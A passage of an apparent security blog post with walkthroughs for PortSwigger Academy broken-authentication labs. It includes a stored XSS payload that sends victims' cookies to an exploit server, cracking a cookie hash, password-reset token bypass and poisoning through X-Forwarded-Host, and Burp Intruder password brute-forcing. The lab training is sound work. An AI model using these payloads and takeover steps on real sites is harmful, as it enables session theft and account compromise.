vulnerable to XSS.<li>Go to the exploit server and make a note of the URL.<li><p>Go to one of the blogs and post a comment containing the following <a href="https://portswigger.net/web-security/cross-site-scripting/stored">stored XSS</a> payload, remembering to enter your own exploit server ID:</p><p><code class="language-plaintext highlighter-rouge">&lt;script&gt;document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie&lt;/script&gt;</code></p><li>On the exploit server, open the access log. There should be a <code class="language-plaintext highlighter-rouge">GET</code> request from the victim containing their <code class="language-plaintext highlighter-rouge">stay-logged-in</code> cookie.<li><p>Decode the cookie in Burp Decoder. The result will be:</p><p><code class="language-plaintext highlighter-rouge">carlos:26323c16d5f4dabff3bb136f2460a943</code></p><li>Copy the hash and paste it into a search engine. This will reveal that the password is <code class="language-plaintext highlighter-rouge">onceuponatime</code>.<li>Log in to the victim’s account, go to the “My account” page, and delete their account to solve the lab.</ol><h2 id="password-reset-broken-logic"><span class="mr-2">Password reset broken logic</span><a href="#password-reset-broken-logic" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, click the <strong>Forgot your password?</strong> link and enter your own username.<li>Click the <strong>Email client</strong> button to view the password reset email that was sent. Click the link in the email and reset your password to whatever you want.<li>In Burp, go to <strong>Proxy &gt; HTTP history</strong> and study the requests and responses for the password reset functionality. Observe that the reset token is provided as a URL query parameter in the reset email. Notice that when you submit your new password, the <code class="language-plaintext highlighter-rouge">POST /forgot-password?temp-forgot-password-token</code> request contains the username as hidden input. Send this request to Burp Repeater.<li>In Burp Repeater, observe that the password reset functionality still works even if you delete the value of the <code class="language-plaintext highlighter-rouge">temp-forgot-password-token</code> parameter in both the URL and request body. This confirms that the token is not being checked when you submit the new password.<li>In your browser, request a new password reset and change your password again. Send the <code class="language-plaintext highlighter-rouge">POST /forgot-password?temp-forgot-password-token</code> request to Burp Repeater again.<li>In Burp Repeater, delete the value of the <code class="language-plaintext highlighter-rouge">temp-forgot-password-token</code> parameter in both the URL and request body. Change the <code class="language-plaintext highlighter-rouge">username</code> parameter to <code class="language-plaintext highlighter-rouge">carlos</code>. Set the new password to whatever you want and send the request.<li>In your browser, log in to Carlos’s account using the new password you just set. Click <strong>My account</strong> to solve the lab.</ol><h2 id="password-reset-poisoning-via-middleware"><span class="mr-2">Password reset poisoning via middleware</span><a href="#password-reset-poisoning-via-middleware" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, investigate the password reset functionality. Observe that a link containing a unique reset token is sent via email.<li>Send the <code class="language-plaintext highlighter-rouge">POST /forgot-password</code> request to Burp Repeater. Notice that the <code class="language-plaintext highlighter-rouge">X-Forwarded-Host</code> header is supported and you can use it to point the dynamically generated reset link to an arbitrary domain.<li>Go to the exploit server and make a note of your exploit server URL.<li><p>Go back to the request in Burp Repeater and add the <code class="language-plaintext highlighter-rouge">X-Forwarded-Host</code> header with your exploit server URL:</p><p><code class="language-plaintext highlighter-rouge">X-Forwarded-Host: your-exploit-server-id.web-security-academy.net</code></p><li>Change the <code class="language-plaintext highlighter-rouge">username</code> parameter to <code class="language-plaintext highlighter-rouge">carlos</code> and send the request.<li>Go to the exploit server and open the access log. You should see a <code class="language-plaintext highlighter-rouge">GET /forgot-password</code> request, which contains the victim’s token as a query parameter. Make a note of this token.<li>Go back to your email client and copy the valid password reset link (not the one that points to the exploit server). Paste this into your browser and change the value of the <code class="language-plaintext highlighter-rouge">temp-forgot-password-token</code> parameter to the value that you stole from the victim.<li>Load this URL and set a new password for Carlos’s account.<li>Log in to Carlos’s account using the new password to solve the lab.</ol><h2 id="password-brute-force-via-password-change"><span class="mr-2">Password brute-force via password change</span><a href="#password-brute-force-via-password-change" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><ol><li>With Burp running, log in and experiment with the password change functionality. Observe that the username is submitted as hidden input in the request.<li>Notice the behavior when you enter the wrong current password. If the two entries for the new password match, the account is locked. However, if you enter two different new passwords, an error message simply states <code class="language-plaintext highlighter-rouge">Current password is incorrect</code>. If you enter a valid current password, but two different new passwords, the message says <code class="language-plaintext highlighter-rouge">New passwords do not match</code>. We can use this message to enumerate correct passwords.<li>Enter your correct current password and two new passwords that do not match. Send this <code class="language-plaintext highlighter-rouge">POST /my-account/change-password</code> request to Burp Intruder.<li><p>In Burp Intruder, change the <code class="language-plaintext highlighter-rouge">username</code> parameter to <code class="language-plaintext highlighter-rouge">carlos</code> and add a payload position to the <code class="language-plaintext highlighter-rouge">current-password</code> parameter. Make sure that the new password parameters are set to two different values. For example:</p><p><code class="language-plaintext highlighter-rouge">username=carlos&amp;current-password=§incorrect-password§&amp;new-password-1=123&amp;new-password-2=abc</code></p><li>On the <strong>Payloads</strong> tab, enter the list of passwords as the payload set<li>On the <strong>Options</strong> tab, add a grep match rule to flag responses containing <code class="language-plaintext highlighter-rouge">New passwords do not match</code>. Start the attack.<li>When the attack finished, notice that one response was found that contains the <code class="language-plaintext highlighter-rouge">New passwords do not match</code> message. Make a note of this password.<li>In your browser, log out of your own account and lock back in with the username <code class="language-plaintext highlighter-rouge">carlos</code> and the password that you just identified.<li>Click <strong>My account</strong> to solve the lab.</ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/web-security/'>Web Security</a>, <a href='/categories/portswigger-academy/'>Portswigger Academy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/web-security/" class="post-tag no-text-decoration" >web security</a> <a href="/tags/labs/" class="post-tag no-text-decoration" >labs</a> <a href="/tags/owasp/" class="post-tag no-text-decoration" >owasp</a> <a href="/tags/auth/" class="post-tag no-text-decoration" >auth</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Broken+Authentication+Labs+-+s4yhii%27s+Blog&url=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FBroken-Authentication-Labs%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Broken+Authentication+Labs+-+s4yhii%27s+Blog&u=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FBroken-Authentication-Labs%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fs4yhii.github.io%2Fposts%2FBroken-Authentication-Labs%2F&text=Broken+Authentication+Labs+-+s4yhii%27s+Blog" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Tickets-popcorn-please/">Tickets and Popcorn please!, The Day main.js Became the Key Vault</a><li><a href="/posts/CyberApocalypse-CTF2025-Web/">Cyber Apocalypse 2025 - 6x Web Challenges Writeup</a><li><a href="/posts/CyberApocalypse-CTF2024-Web/">Cyber Apocalypse 2024 - 4x Web Challenges Writeup</a><li><a href="/posts/Web-Cache-Poisoning/">Web Cache Poisoning Techniques</a><li><a href="/posts/HTB-Cyber-Apocalypse-CTF-Web-Writeups/">Cyber Apocalypse 2023 2x Web Challenges Writeup</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web-security/">web security</a> <a class="post-tag" href="/tags/owasp/">owasp</a> <a class="post-tag" href="/tags/labs/">labs</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/cms/">cms</a> <a class="post-tag" href="/tags/python/">python</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/OS-Command-Injection-Labs/"><div class="card-body"> <em class="small" data-ts="1654876800" data-df="ll" > Jun 10, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Os Command Injection Labs</h3><div class="text-muted small"><p> OS command injection allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its ...</p></div></div></a></div><div class="card"> <a href="/posts/SQL-Injection-Labs/"><div class="card-body"> <em class="small" data-ts="1643126400" data-df="ll" > Jan 25, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>SQL Injection - Labs</h3><div class="text-muted small"><p> Lab 1 - SQL injection vulnerability in WHERE clause allowing retrieval of hidden data We need to retrieve hidden data so we search query’s in the web where we can inject some sql injection payloads...</p></div></div></a></div><div class="card"> <a href="/posts/Broken-Authentication/"><div class="card-body"> <em class="small" data-ts="1647360000" data-df="ll" > Mar 15, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Broken Authentication</h3><div class="text-muted small"><p> Authentication is the process of verifying the identity of a given user or client. In other words, it involves making sure that they really are who they claim to be, there are three authentication ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Attacking-JSON-Web-Tokens/" class="btn btn-outline-primary" prompt="Older"><p>Attacking Json Web Tokens</p></a> <a href="/posts/Broken-Authentication/" class="btn btn-outline-primary" prompt="Newer"><p>Broken Authentication</p></a></div><script type="text/javascript"> $(function () { const origin = "https://giscus.app"; const iframe = "iframe.giscus-frame"; const lightTheme = "light"; const darkTheme = "dark_dimmed"; let initTheme = lightTheme; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } let giscusAttributes = { "src": "https://giscus.app/client.js", "data-repo": "s4yhii/s4yhii.github.io", "data-repo-id": "R_kgDOHtsc-g", "data-category": "Announcements", "data-category-id": "DIC_kwDOHtsc-s4CQh10", "data-mapping": "title", "data-reactions-enabled": "1", "data-emit-metadata": "0", "data-theme": initTheme, "data-input-position": "top", "data-lang": "en", "crossorigin": "anonymous", "async": "" }; let giscusScript = document.createElement("script"); Object.entries(giscusAttributes).forEach(([key, value]) => giscusScript.setAttribute(key, value)); document.getElementById("tail-wrapper").appendChild(giscusScript); addEventListener("message", (event) => { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; const theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); const message = { setConfig: { theme: theme } }; const giscus = document.querySelector(iframe).contentWindow; giscus.postMessage({ giscus: message }, origin); } }); }); </script></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2026 <a href="https://twitter.com/s4yhii">Jesus Lujan</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/web-security/">web security</a> <a class="post-tag" href="/tags/owasp/">owasp</a> <a class="post-tag" href="/tags/labs/">labs</a> <a class="post-tag" href="/tags/aws/">aws</a> <a class="post-tag" href="/tags/rce/">rce</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/cloud/">cloud</a> <a class="post-tag" href="/tags/cms/">cms</a> <a class="post-tag" href="/tags/python/">python</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-V0V53P7YVQ"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-V0V53P7YVQ'); }); </script>
